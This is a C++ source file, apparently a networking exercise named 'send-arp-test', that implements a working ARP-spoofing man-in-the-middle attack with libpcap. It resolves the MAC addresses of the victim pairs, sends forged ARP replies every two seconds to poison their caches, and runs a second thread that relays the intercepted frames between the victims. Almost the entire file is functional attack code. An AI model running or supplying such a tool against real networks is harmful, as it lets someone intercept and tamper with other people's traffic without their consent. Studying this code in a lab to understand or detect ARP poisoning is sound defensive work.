#include <cstdio>
#include <pcap.h>
#include <string>
#include <net/if.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <vector>
#include <thread>
#include "ethhdr.h"
#include "arphdr.h"
#include <netinet/ip.h>  // Required for IP header structure

typedef std::string str;

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface> <sender IP1> <target IP1> [<sender IP2> <target IP2> ...]\n");
    printf("sample: send-arp-test wlan0 192.168.0.1 192.168.0.142 192.168.0.142 192.168.0.1\n");
}

str get_mac_address(const str& iface) {
    int fd;
    struct ifreq ifr;
    char mac_addr[18] = {0};

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, iface.c_str(), IFNAMSIZ - 1);

    if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) {
        perror("ioctl");
        close(fd);
        exit(EXIT_FAILURE);
    }

    close(fd);

    sprintf(mac_addr, "%02x:%02x:%02x:%02x:%02x:%02x",
            (unsigned char)ifr.ifr_hwaddr.sa_data[0],
            (unsigned char)ifr.ifr_hwaddr.sa_data[1],
            (unsigned char)ifr.ifr_hwaddr.sa_data[2],
            (unsigned char)ifr.ifr_hwaddr.sa_data[3],
            (unsigned char)ifr.ifr_hwaddr.sa_data[4],
            (unsigned char)ifr.ifr_hwaddr.sa_data[5]);

    return str(mac_addr);
}

str get_ip_address(const str& iface) {
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, iface.c_str(), IFNAMSIZ - 1);

    if (ioctl(fd, SIOCGIFADDR, &ifr) == -1) {
        perror("ioctl");
        close(fd);
        exit(EXIT_FAILURE);
    }

    close(fd);

    return inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr);
}

void send_arp_packet(pcap_t* handle, const Mac& src_mac, const Mac& dst_mac, const Ip& src_ip, const Ip& dst_ip, uint16_t op) {
    EthArpPacket packet;

    packet.eth_.smac_ = src_mac;
    packet.eth_.dmac_ = dst_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(op);
    packet.arp_.smac_ = src_mac;
    packet.arp_.sip_ = htonl(src_ip);
    packet.arp_.tmac_ = dst_mac;
    packet.arp_.tip_ = htonl(dst_ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "Error sending ARP packet: %s\n", pcap_geterr(handle));
    }
}

EthArpPacket send_arp_request(pcap_t* handle, const Mac& my_mac, const Ip& my_ip, const Ip& target_ip) {
    EthArpPacket request;
    request.eth_.dmac_ = Mac::broadcastMac();
    request.eth_.smac_ = my_mac;
    request.eth_.type_ = htons(EthHdr::Arp);

    request.arp_.hrd_ = htons(ArpHdr::ETHER);
    request.arp_.pro_ = htons(EthHdr::Ip4);
    request.arp_.hln_ = Mac::SIZE;
    request.arp_.pln_ = Ip::SIZE;
    request.arp_.op_ = htons(ArpHdr::Request);
    request.arp_.smac_ = my_mac;
    request.arp_.sip_ = htonl(my_ip);
    request.arp_.tmac_ = Mac("00:00:00:00:00:00");
    request.arp_.tip_ = htonl(target_ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&request), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "Error sending ARP request: %s\n", pcap_geterr(handle));
    }

    struct pcap_pkthdr* header;
    const u_char* packet;
    EthArpPacket* capture;

    while (true) {
        int ret = pcap_next_ex(handle, &header, &packet);
        if (ret == 1) {
            capture = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(packet));
            if ((ntohs(capture->eth_.type_) == 0x0806) && (ntohs(capture->arp_.op_) == ArpHdr::Reply)) {
                return *capture;
            }
        }
    }
}

void arp_spoofing(pcap_t* handle, const Mac& my_mac, const Ip& my_ip, const std::vector<Ip>& sender_ips, const std::vector<Ip>& target_ips) {
    std::vector<Mac> sender_macs(sender_ips.size());
    std::vector<Mac> target_macs(target_ips.size());

    for (size_t i = 0; i < sender_ips.size(); ++i) {
        EthArpPacket sender_reply = send_arp_request(handle, my_mac, my_ip, sender_ips[i]);
        sender_macs[i] = sender_reply.eth_.smac_;

        EthArpPacket target_reply = send_arp_request(handle, my_mac, my_ip, target_ips[i]);
        target_macs[i] = target_reply.eth_.smac_;
    }

    while (true) {
        for (size_t i = 0; i < sender_ips.size(); ++i) {
            send_arp_packet(handle, my_mac, sender_macs[i], target_ips[i], sender_ips[i], ArpHdr::Reply);
            send_arp_packet(handle, my_mac, target_macs[i], sender_ips[i], target_ips[i], ArpHdr::Reply);
        }
        sleep(2);
    }
}

void relay_packets(pcap_t* handle, const std::vector<Ip>& sender_ips, const std::vector<Ip>& target_ips, const std::vector<Mac>& sender_macs, const std::vector<Mac>& target_macs, const Mac& my_mac) {
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;

        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("Error capturing packet: %s\n", pcap_geterr(handle));
            break;
        }

        EthHdr* eth_hdr = (EthHdr*)packet;
        struct ip* ip_header = (struct ip*)(packet + sizeof(EthHdr)); 

        for (size_t i = 0; i < sender_ips.size(); ++i) {
            if (eth_hdr->smac_ == sender_macs[i] && eth_hdr->dmac_ == my_mac) {
                eth_hdr->smac_ = my_mac;
                eth_hdr->dmac_ = target_macs[i];
                pcap_sendpacket(handle, packet, header->caplen);
            } else if (eth_hdr->smac_ == target_macs[i] && eth_hdr->dmac_ == my_mac) {
                eth_hdr->smac_ = my_mac;
                eth_hdr->dmac_ = sender_macs[i];
                pcap_sendpacket(handle, packet, header->caplen);
            }
        }
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc % 2) != 0) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    std::vector<Ip> sender_ips;
    std::vector<Ip> target_ips;

    for (int i = 2; i < argc; i += 2) {
        sender_ips.push_back(Ip(argv[i]));
        target_ips.push_back(Ip(argv[i + 1]));
    }

    str my_mac_str = get_mac_address(dev);
    str my_ip_str = get_ip_address(dev);

    Mac my_mac(my_mac_str.c_str());
    Ip my_ip(my_ip_str.c_str());

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    std::thread spoofing_thread(arp_spoofing, handle, my_mac, my_ip, sender_ips, target_ips);
    std::thread relaying_thread([&handle, &sender_ips, &target_ips, &my_mac, &my_ip]() {
        std::vector<Mac> sender_macs(sender_ips.size());
        std::vector<Mac> target_macs(target_ips.size());

        for (size_t i = 0; i < sender_ips.size(); ++i) {
            EthArpPacket sender_reply = send_arp_request(handle, my_mac, my_ip, sender_ips[i]);
            sender_macs[i] = sender_reply.eth_.smac_;

            EthArpPacket target_reply = send_arp_request(handle, my_mac, my_ip, target_ips[i]);
            target_macs[i] = target_reply.eth_.smac_;
        }

        relay_packets(handle, sender_ips, target_ips, sender_macs, target_macs, my_mac);
    });


    spoofing_thread.join();
    relaying_thread.join();

    pcap_close(handle);
    return 0;
}
